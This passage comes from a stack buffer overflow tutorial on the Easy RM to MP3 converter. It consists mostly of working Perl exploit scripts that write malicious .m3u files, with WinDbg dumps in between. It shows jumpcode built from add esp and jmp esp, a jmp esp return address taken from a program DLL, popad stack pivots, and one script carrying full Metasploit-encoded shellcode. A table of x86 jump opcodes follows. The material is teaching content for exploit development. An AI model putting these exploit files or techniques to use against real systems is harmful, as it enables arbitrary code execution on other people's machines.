add esp,0x5e\nadd esp,0x5e\n7c901214 add esp,0x5e\nadd esp,0x5e\n7c901217 add esp,0x5e\nadd esp,0x5e\n7c90121a jmp esp\njmp esp\n7c90121c\n0:014> u 7c901211\nntdll!DbgBreakPoint+0x3:\n7c901211 83c45e          add     esp,5Eh\n7c901214 83c45e          add     esp,5Eh\n7c901217 83c45e          add     esp,5Eh\n7c90121a ffe4            jmp     esp\nOk, so the opcode for the entire jumpcode is\n0x83,0xc4,0x5e,0x83,0xc4,0x5e,0x83,0xc4,0x5e,0xff,0xe4\nmy $file= \"test1.m3u\";\nmy $buffersize = 26094;\nmy $junk= \"A\" x 250;\nmy $nop = \"\\x90\" x 50;\nmy $shellcode = \"\\xcc\";  #position 300\nmy $restofbuffer = \"A\" x ($buffersize-(length($junk)+length($nop)+length($shellc\node)));\nmy $eip = \"BBBB\";\nmy $preshellcode = \"X\" x 4;\nmy $jumpcode = \"\\x83\\xc4\\x5e\" .   #add esp,0x5e\n\"\\x83\\xc4\\x5e\" .               #add esp,0x5e\n\"\\x83\\xc4\\x5e\" .               #add esp,0x5e\n\"\\xff\\xe4\";                    #jmp esp\nmy $nop2 = \"0x90\" x 10;   # only used to visually separate\nmy $buffer = $junk.$nop.$shellcode.$restofbuffer;\nprint \"Size of buffer : \".length($buffer).\"\\n\";\nopen($FILE,\">$file\");\nprint $FILE $buffer.$eip.$preshellcode.$jumpcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\nThe jumpcode is perfectly placed at ESP.  When the shellcode is called,\nESP would point into the NOPs (between 00ff842 and 000ff873). Shellcode\nstarts at 000ff874\n(45c.f60): Access violation - code c0000005 (!!! second chance !!!)\neax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608\neip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0x42424231:\n42424242 ??              ???\n0:000> d esp\n000ff730  83 c4 5e 83 c4 5e 83 c4-5e ff e4 00 01 00 00 00  ..^..^..^.......\n000ff740  30 f7 0f 00 00 00 00 00-41 41 41 41 41 41 41 41  0.......AAAAAAAA\n000ff750  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff760  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff770  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff780  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff790  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff7a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0:000> d\n000ff7b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff7c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0:000> d\n000ff830  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff840  41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90  AA..............\n000ff850  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff870  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA\n000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\nThe last thing we need to do is overwrite EIP with a \u201cjmp esp\u201d.  From\npart 1 of the tutorial, we know that this can be achieved via address\n0x01ccf23a\nWhat will happen when the overflow occurs ?\n* Real shellcode will be placed in the first part of the string that\nis sent, and will end up at ESP+300.  The real shellcode is\nprepended with NOP\u2019s to allow the jump to be off a little bit\n* EIP will be overwritten with 0x01ccf23a (points to a dll, run \u201cJMP\nESP\u201d)\n* The data after overwriting EIP will be overwritten with jump code\nthat adds 282 to ESP and then jumps to that address.\n* After the payload is sent, EIP will jump to esp. This will triggger\nthe jump code to jump to ESP+282.  Nop sled, and shellcode gets\nexecuted.\nLet\u2019s try with a break as real shellcode :\nmy $file= \"test1.m3u\";\nmy $buffersize = 26094;\nmy $junk= \"A\" x 250;\nmy $nop = \"\\x90\" x 50;\nmy $shellcode = \"\\xcc\";  #position 300\nmy $restofbuffer = \"A\" x ($buffersize-(length($junk)+length($nop)+length($shellc\node)));\nmy $eip = pack('V',0x01ccf23a);  #jmp esp from MSRMCcodec02.dll\nmy $preshellcode = \"X\" x 4;\nmy $jumpcode = \"\\x83\\xc4\\x5e\" .   #add esp,0x5e\n\"\\x83\\xc4\\x5e\" .               #add esp,0x5e\n\"\\x83\\xc4\\x5e\" .               #add esp,0x5e\n\"\\xff\\xe4\";                    #jmp esp\nmy $buffer = $junk.$nop.$shellcode.$restofbuffer;\nprint \"Size of buffer : \".length($buffer).\"\\n\";\nopen($FILE,\">$file\");\nprint $FILE $buffer.$eip.$preshellcode.$jumpcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\nThe generated m3u file will bring us right at our shellcode (which is a\nbreak). (EIP = 0x000ff874 = begin of shellcode )\n(d5c.c64): Break instruction exception - code 80000003 (!!! second chance !!!)\neax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608\neip=000ff874 esp=000ff84a ebp=003440c0 iopl=0         nv up ei pl nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0xff863:\n000ff874 cc              int     3\n0:000> d esp\n000ff84a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff85a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff86a  90 90 90 90 90 90 90 90-90 90 cc 41 41 41 41 41  ...........AAAAA\n000ff87a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff88a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff89a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8aa  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8ba  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\nReplace the break with some real shellcode (and replace the A\u2019s with\nNOPs)\u2026  (shellcode : excluded characters 0x00, 0xff, 0xac, 0xca)\nWhen you replace the A\u2019s with NOPs, you\u2019ll have more space to jump\ninto, so we can live with jumpcode that only jumps 188 positions\nfurther (2 times 5e)\nmy $file= \"test1.m3u\";\nmy $buffersize = 26094;\nmy $junk= \"\\x90\" x 200;\nmy $nop = \"\\x90\" x 50;\n# windows\/exec - 303 bytes\n# http:\/\/www.metasploit.com\n# Encoder: x86\/alpha_upper\n# EXITFUNC=seh, CMD=calc\nmy $shellcode = \"\\x89\\xe2\\xd9\\xeb\\xd9\\x72\\xf4\\x5b\\x53\\x59\\x49\\x49\\x49\\x49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4d\" .\n\"\\x38\\x51\\x54\\x45\\x50\\x43\\x30\\x45\\x50\\x4c\\x4b\\x51\\x55\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x44\\x45\\x43\\x48\\x43\\x31\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x45\\x48\\x4c\\x4b\\x51\\x4f\\x51\\x30\\x45\\x51\\x4a\" .\n\"\\x4b\\x50\\x49\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x45\\x51\\x4a\\x4e\\x46\" .\n\"\\x51\\x49\\x50\\x4a\\x39\\x4e\\x4c\\x4b\\x34\\x49\\x50\\x44\\x34\\x45\" .\n\"\\x57\\x49\\x51\\x49\\x5a\\x44\\x4d\\x45\\x51\\x48\\x42\\x4a\\x4b\\x4c\" .\n\"\\x34\\x47\\x4b\\x50\\x54\\x51\\x34\\x45\\x54\\x44\\x35\\x4d\\x35\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x43\\x31\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4b\\x39\\x51\\x4c\\x46\" .\n\"\\x44\\x45\\x54\\x48\\x43\\x51\\x4f\\x46\\x51\\x4c\\x36\\x43\\x50\\x50\" .\n\"\\x56\\x43\\x54\\x4c\\x4b\\x47\\x36\\x46\\x50\\x4c\\x4b\\x47\\x30\\x44\" .\n\"\\x4c\\x4c\\x4b\\x42\\x50\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x43\\x58\\x44\" .\n\"\\x48\\x4d\\x59\\x4c\\x38\\x4d\\x53\\x49\\x50\\x42\\x4a\\x46\\x30\\x45\" .\n\"\\x38\\x4c\\x30\\x4c\\x4a\\x45\\x54\\x51\\x4f\\x42\\x48\\x4d\\x48\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x50\\x57\\x4b\\x4f\\x4b\\x57\\x42\\x43\\x43\" .\n\"\\x51\\x42\\x4c\\x45\\x33\\x45\\x50\\x41\\x41\";\nmy $restofbuffer = \"\\x90\" x ($buffersize-(length($junk)+length($nop)+length($she\nllcode)));\nmy $eip = pack('V',0x01ccf23a);  #jmp esp from MSRMCcodec02.dll\nmy $preshellcode = \"X\" x 4;\nmy $jumpcode = \"\\x83\\xc4\\x5e\" .   #add esp,0x5e\n\"\\x83\\xc4\\x5e\" .               #add esp,0x5e\n\"\\xff\\xe4\";                    #jmp esp\nmy $nop2 = \"0x90\" x 10;   # only used to visually separate\nmy $buffer = $junk.$nop.$shellcode.$restofbuffer;\nprint \"Size of buffer : \".length($buffer).\"\\n\";\nopen($FILE,\">$file\");\nprint $FILE $buffer.$eip.$preshellcode.$jumpcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\n[57]image\npwned again :-)\nSome other ways to jump\n* popad\n* hardcode address to jump to\nthe \u201cpopap\u201d instruction may help us \u2018jumping\u2019 to our shellcode as well.\npopad (pop all double) will pop double words from the stack (ESP) into\nthe general-purpose registers, in one action. The registers are loaded\nin the following order : EDI, ESI, EBP, EBX, EDX, ECX and EAX.  As a\nresult, the ESP register is incremented after each register is loaded\n(triggered by the popad). One popad will thus take 32 bytes from ESP\nand pops them in the registers in an orderly fashion.\nThe popad opcode is 0x61\nSo suppose you need to jump 40 bytes, and you only have a couple of\nbytes to make the jump, you can issue 2 popad\u2019s to point ESP to the\nshellcode (which starts with NOPs to make up for the (2 times 32 bytes\n\u2013 40 bytes of space that we need to jump over))\nLet\u2019s use the Easy RM to MP3 vulnerability again to demonstrate this\ntechnique :\nWe\u2019ll reuse one of the script example from earlier in this post, and\nwe\u2019ll build a fake buffer that will put 13 X\u2019s at ESP, then we\u2019ll\npretend there is some garbage (D\u2019s and A\u2019s) and then place to put our\nshellcode (NOPS + A\u2019s)\nmy $file= \"test1.m3u\";\nmy $buffersize = 26094;\nmy $junk= \"A\" x 250;\nmy $nop = \"\\x90\" x 50;\nmy $shellcode = \"\\xcc\";\nmy $restofbuffer = \"A\" x ($buffersize-(length($junk)+length($nop)+length($shellc\node)));\nmy $eip = \"BBBB\";\nmy $preshellcode = \"X\" x 17;  #let's pretend this is the only space we have avai\nlable\nmy $garbage = \"\\x44\" x 100;  #let\u2019s pretend this is the space we need to jump ov\ner\nmy $buffer = $junk.$nop.$shellcode.$restofbuffer;\nprint \"Size of buffer : \".length($buffer).\"\\n\";\nopen($FILE,\">$file\");\nprint $FILE $buffer.$eip.$preshellcode.$garbage;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\nAfter opening the file in Easy RM to MP3, the application dies, and ESP\nlooks like this :\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000001 ebx=00104a58 ecx=7c91005d edx=003f0000 esi=77c5fce0 edi=0000666d\neip=42424242 esp=000ff730 ebp=00344158 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0x42424231:\n42424242 ??              ???\n0:000> d esp\n000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 44 44 44  XXXXXXXXXXXXXDDD |  =\n> 13 bytes\n000ff740  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD |  =\n> garbage\n000ff750  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =>\ngarbage\n000ff760  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =>\ngarbage\n000ff770  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =>\ngarbage\n000ff780  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =>\ngarbage\n000ff790  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =>\ngarbage\n000ff7a0  00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA | =>\ngarbage\n0:000> d\n000ff7b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff7c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n0:000> d\n000ff830  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\ngarbage\n000ff840  41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90  AA.............. | =>\ngarbage\n000ff850  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................ | =>\nNOPS\/Shellcode\n000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................ | =>\nNOPS\/Shellcode\n000ff870  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA | =>\nNOPS\/Shellcode\n000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\nNOPS\/Shellcode\n000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\nNOPS\/Shellcode\n000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =>\nNOPS\/Shellcode\nLet\u2019s pretend that we need to use the 13 X\u2019s  (so 13 bytes) that are\navailable directly at ESP to jump over 100 D\u2019s (44) and 160 A\u2019s (so a\ntotal of 260 bytes) to end up at our shellcode (starts with NOPs, then\na breakpoint, and then A\u2019s (=shellcode))\nOne popad = 32 bytes. So 260 bytes = 9 popad\u2019s (-28 bytes)\n(so we need to start our shellcode with nops, or start the shellcode at\n[start of shellcode]+28 bytes\nIn our case, we have put some nops before the shellcode, so let\u2019s try\nto \u201cpopad\u201d into the nops and see if the application breaks at our\nbreakpoint.\nFirst, overwrite EIP again with jmp esp. (see one of the previous\nexploit scripts)\nThen, instead of the X\u2019s, perform 9 popad\u2019s, followed by \u201cjmp esp\u201d\nopcode (0xff,0xe4)\nmy $file= \"test1.m3u\";\nmy $buffersize = 26094;\nmy $junk= \"A\" x 250;\nmy $nop = \"\\x90\" x 50;\nmy $shellcode = \"\\xcc\";\nmy $restofbuffer = \"A\" x ($buffersize-(length($junk)+length($nop)+length($shellc\node)));\nmy $eip = pack('V',0x01ccf23a);  #jmp esp from MSRMCcodec02.dll\nmy $preshellcode = \"X\" x 4;  # needed to point ESP at next 13 bytes below\n$preshellcode=$preshellcode.\"\\x61\" x 9;  #9 popads\n$preshellcode=$preshellcode.\"\\xff\\xe4\";  #10th and 11th byte, jmp esp\n$preshellcode=$preshellcode.\"\\x90\\x90\\x90\";  #fill rest with some nops\nmy $garbage = \"\\x44\" x 100;  #garbage to jump over\nmy $buffer = $junk.$nop.$shellcode.$restofbuffer;\nprint \"Size of buffer : \".length($buffer).\"\\n\";\nopen($FILE,\">$file\");\nprint $FILE $buffer.$eip.$preshellcode.$garbage;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\nAfter opening the file, the application does indeed break at the\nbreakpoint.  EIP and ESP look like this :\n(f40.5f0): Break instruction exception - code 80000003 (first chance)\neax=90909090 ebx=90904141 ecx=90909090 edx=90909090 esi=41414141 edi=41414141\neip=000ff874 esp=000ff850 ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0xff863:\n000ff874 cc              int     3\n0:000> d eip\n000ff874  cc 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA\n000ff884  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff894  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8a4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8b4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8c4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8d4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8e4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0:000> d eip-32\n000ff842  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff852  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff862  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff872  90 90 cc 41 41 41 41 41-41 41 41 41 41 41 41 41  ...AAAAAAAAAAAAA\n000ff882  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff892  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8a2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8b2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0:000> d esp\n000ff850  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff870  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA\n000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n=> the popad\u2019s have worked and made esp point at the nops. Then the\njump to esp was made (0xff 0xe4), which made EIP jump to nops, and\nslide to the breakpoint (at 000f874)\nReplace the A\u2019s with real shellcode :\n[58]image\npnwed again !\nAnother (less preferred, but still possible) way to jump to shellcode\nis by using jumpcode that simply jumps to the address (or an offset of\na register).  Since the addresses\/registers could vary during every\nprogram execution, this technique may not work every time.\nSo, in order to hardcode addresses or offsets of a register, you simply\nneed to find the opcode that will do the jump, and then use that opcode\nin the smaller \u201cfirst\u201d\/stage1 buffer, in order to jump to the real\nshellcode.\nYou should know by now how to find the opcode for assembler\ninstructions, so I\u2019ll stick to 2 examples :\n1. jump to 0x12345678\n0:000> a\n7c90120e jmp 12345678\njmp 12345678\n7c901213\n0:000> u 7c90120e\nntdll!DbgBreakPoint:\n7c90120e e96544a495      jmp     12345678\n=> opcode is 0xe9,0x65,0x44,0xa4,0x95\n2. jump to ebx+124h\n0:000> a\n7c901214 add ebx,124\nadd ebx,124\n7c90121a jmp ebx\njmp ebx\n7c90121c\n0:000> u 7c901214\nntdll!DbgUserBreakPoint+0x2:\n7c901214 81c324010000    add     ebx,124h\n7c90121a ffe3            jmp     ebx\n=> opcodes are 0x81,0xc3,0x24,0x01,0x00,0x00  (add ebx 124h) and\n0xff,0xe3 (jmp ebx)\nShort jumps & conditional jumps\nIn the event you need to jump over just a few bytes, then you can use a\ncouple \u2018short jump\u2019 techniques to accomplish this :\n\u2013 a short jump : (jmp) : opcode 0xeb, followed by the number of bytes\nSo if you want to jump 30 bytes, the opcode is 0xeb,0x1e\n\u2013 a conditional (short\/near) jump : (\u201cjump if condition is met\u201d) : This\ntechnique is based on the states of one or more of the status flags in\nthe EFLAGS register (CF,OF,PF,SF and ZF).  If the flags are in the\nspecified state (condition), then a jump can be made to the target\ninstruction specified by the destination operand. This target\ninstruction is specified with a relative offset (relative to the\ncurrent value of EIP).\nExample : suppose you want to jump 6 bytes : Have a look at the flags\n(ollydbg), and depending on the flag status, you can use one of the\nopcodes below\nLet\u2019s say the Zero flag is 1, then you can use opcode 0x74, followed by\nthe number of bytes you want to jump  (0x06 in our case)\nThis is a little table with jump opcodes and flag conditions :\nCode Mnemonic Description\n77 cb JA rel8 Jump short if above (CF=0 and ZF=0)\n73 cb JAE rel8 Jump short if above or equal (CF=0)\n72 cb JB rel8 Jump short if below (CF=1)\n76 cb JBE rel8 Jump short if below or equal (CF=1 or ZF=1)\n72 cb JC rel8 Jump short if carry (CF=1)\nE3 cb JCXZ rel8 Jump short if CX register is 0\nE3 cb JECXZ rel8 Jump short if ECX register is 0\n74 cb JE rel8 Jump short if equal (ZF=1)\n7F cb JG rel8 Jump short if greater (ZF=0 and SF=OF)\n7D cb JGE rel8 Jump short if greater or equal (SF=OF)\n7C cb JL rel8 Jump short if less (SF<>OF)\n7E cb JLE rel8 Jump short if less or equal (ZF=1 or SF<>OF)\n76 cb JNA rel8 Jump short if not above (CF=1 or ZF=1)\n72 cb JNAE rel8 Jump short if not above or equal (CF=1)\n73 cb JNB rel8 Jump short if not below (CF=0)\n77 cb JNBE rel8 Jump short if not below or equal (CF=0 and ZF=0)\n73 cb JNC rel8 Jump short if not carry (CF=0)\n75 cb JNE rel8 Jump short if not equal (ZF=0)\n7E cb JNG rel8 Jump short if not greater (ZF=1 or SF<>OF)\n7C cb JNGE rel8 Jump short if not greater or equal (SF<>OF)\n7D cb JNL rel8 Jump short if not less (SF=OF)\n7F cb JNLE rel8 Jump short if not less or equal (ZF=0 and SF=OF)\n71 cb JNO rel8 Jump short if not overflow (OF=0)\n7B cb JNP rel8 Jump short if not parity (PF=0)\n79 cb JNS rel8 Jump short if not sign (SF=0)\n75 cb JNZ rel8 Jump short if not zero (ZF=0)\n70 cb JO rel8 Jump short if overflow (OF=1)\n7A cb JP rel8 Jump short if parity (PF=1)\n7A cb JPE rel8 Jump short if parity even (PF=1)\n7B cb JPO rel8 Jump short if parity odd (PF=0)\n78 cb JS rel8 Jump short if sign (SF=1)\n74 cb JZ rel8 Jump short if zero (ZF = 1)\n0F 87 cw\/cd JA rel16\/32 Jump near if above (CF=0 and ZF=0)\n0F 83 cw\/cd JAE rel16\/32 Jump near if above or equal (CF=0)\n0F 82 cw\/cd JB rel16\/32 Jump near if below (CF=1)\n0F 86 cw\/cd JBE rel16\/32 Jump near if below or equal (CF=1 or ZF=1)\n0F 82 cw\/cd JC rel16\/32 Jump near if carry (CF=1)\n0F 84 cw\/cd JE rel16\/32 Jump near if equal (ZF=1)\n0F 84 cw\/cd JZ rel16\/32 Jump near if 0 (ZF=1)\n0F 8F cw\/cd JG rel16\/32 Jump near if greater (ZF=0 and SF=OF)\n0F 8D cw\/cd JGE rel16\/32 Jump near if greater or equal (SF=OF)\n0F 8C cw\/cd JL rel16\/32 Jump near if less (SF<>OF)\n0F 8E cw\/cd JLE rel16\/32 Jump near if less or equal (ZF=1 or SF<>OF)\n0F 86 cw\/cd JNA rel16\/32 Jump near if not above (CF=1 or ZF=1)\n0F 82 cw\/cd JNAE rel16\/32 Jump near if not above or equal (CF=1)\n0F 83 cw\/cd JNB rel16\/32 Jump near if not below (CF=0)\n0F 87 cw\/cd JNBE rel16\/32 Jump near if not below or equal (CF=0 and\nZF=0)\n0F 83 cw\/cd JNC rel16\/32 Jump near if not carry (CF=0)\n0F 85 cw\/cd JNE rel16\/32 Jump near if not equal (ZF=0)\n0F 8E cw\/cd JNG rel16\/32 Jump near if not greater (ZF=1 or SF<>OF)\n0F 8C cw\/cd JNGE rel16\/32 Jump near if not greater or equal (SF<>OF)\n0F 8D cw\/cd JNL rel16\/32 Jump near if not less (SF=OF)\n0F 8F cw\/cd JNLE rel16\/32 Jump near if not less or equal (ZF=0 and\nSF=OF)\n0F 81 cw\/cd JNO rel16\/32 Jump near if not overflow (OF=0)\n0F 8B cw\/cd JNP rel16\/32 Jump near if not parity (PF=0)\n0F 89 cw\/cd JNS rel16\/32 Jump near if not sign (SF=0)\n0F 85 cw\/cd JNZ rel16\/32 Jump near if not zero (ZF=0)\n0F 80 cw\/cd JO rel16\/32 Jump near if overflow (OF=1)\n0F 8A cw\/cd JP rel16\/32 Jump near if parity (PF=1)\n0F 8A cw\/cd JPE rel16\/32 Jump near if parity even (PF=1)\n0F 8B cw\/cd JPO rel16\/32 Jump near if parity odd (PF=0)\n0F 88 cw\/cd JS rel16\/32 Jump near if sign (SF=1)\n0F 84 cw\/cd JZ rel16\/32 Jump near if 0 (ZF=1)\nAs you can see in the table, you can also do a short jump based on\nregister ECX being zero.  One of the Windows SEH protections (see part\n3 of the tutorial series) that have been put in place is the fact that\nregisters are cleared when an exception occurs.  So sometimes you will\neven be able to use  0xe3 as jump opcode (if ECX = 00000000)\nNote : You can find more\/other information about making 2 byte jumps\n(forward and backward\/negative jumps) at\n[59]http:\/\/thestarman.narod.ru\/asm\/2bytejumps.htm\nBackward jumps\nIn the event you need to perform backward jumps (jump with a negative\noffset) :  get the negative number and convert it to hex. Take the\ndword hex value and use that as argument to a jump (\\xeb or \\xe9)\nExample : jump back 7 bytes : -7 = FFFFFFF9,  so jump -7 would be\n\"\\xeb\\xf9\\xff\\xff\"\nExampe : jump back 400 bytes :  -400 = FFFFFE70, so jump -400 bytes =\n\"\\xe9\\x70\\xfe\\xff\\xff\"   (as you can see, this opcode is 5 bytes long.\nSometimes (if you need to stay within a dword size (4 byte limit), then\nyou may need to perform multiple shorter jumps in order to get where\nyou want to be)\nQuestions ? Comments ? Tips & Tricks 